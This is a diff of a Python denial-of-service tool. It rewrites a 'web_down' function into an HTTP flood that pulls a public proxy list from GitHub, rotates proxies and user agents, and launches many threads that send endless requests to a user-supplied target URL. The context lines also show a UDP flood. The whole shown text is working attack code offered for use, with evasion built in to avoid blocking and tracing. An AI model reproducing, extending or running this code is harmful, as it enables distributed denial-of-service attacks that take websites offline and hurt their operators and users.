@@ -73,15 +73,43 @@ def udp_flood(target, port, duration):
             print(Fore.RED + f"[UDP FAIL] Packet to {target}:{port}")
 
 def web_down():
-    url = input(Fore.CYAN + "Target URL (include https://): ")
-    threads = int(input("Number of Threads: "))
-    use_proxy = input("Use proxies? (y/n): ").lower()
-    proxies = load_proxies() if use_proxy == 'y' else [None]
+    os.system('clear')
+    print(Style.BRIGHT + Fore.RED + figlet_format("BCF WEB DOWN", font="slant"))
     print(Fore.YELLOW + "Launching HTTP Flood...")
+
+    target = input(Fore.CYAN + "Target URL (include https://): ")
+    threads = int(input(Fore.CYAN + "Number of Threads: "))
+
+    # Always use proxies
+    print(Fore.YELLOW + "Loading proxies...")
+    try:
+        response = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt")
+        proxies = response.text.strip().split("\n")
+    except Exception as e:
+        print(Fore.RED + f"Failed to load proxies: {e}")
+        return
+
+    def attack():
+        while True:
+            try:
+                proxy = random.choice(proxies)
+                proxy_dict = {
+                    "http": f"http://{proxy}",
+                    "https": f"http://{proxy}"
+                }
+                headers = {
+                    "User-Agent": random.choice(user_agents)
+                }
+                requests.get(target, headers=headers, proxies=proxy_dict, timeout=5)
+                print(Fore.GREEN + f"[HTTP SUCCESS] {proxy}")
+            except:
+                print(Fore.RED + f"[HTTP FAIL] {proxy}")
+
     for _ in range(threads):
-        proxy = random.choice(proxies)
-        threading.Thread(target=http_flood, args=(url, proxy), daemon=True).start()
-    input(Fore.YELLOW + "\nPress Enter to stop...\n")
+        threading.Thread(target=attack).start()
+
+    input(Fore.MAGENTA + "\nPress Enter to stop...")
+
 
 def udp_menu():
     ip = input(Fore.CYAN + "Target IP Address: ")
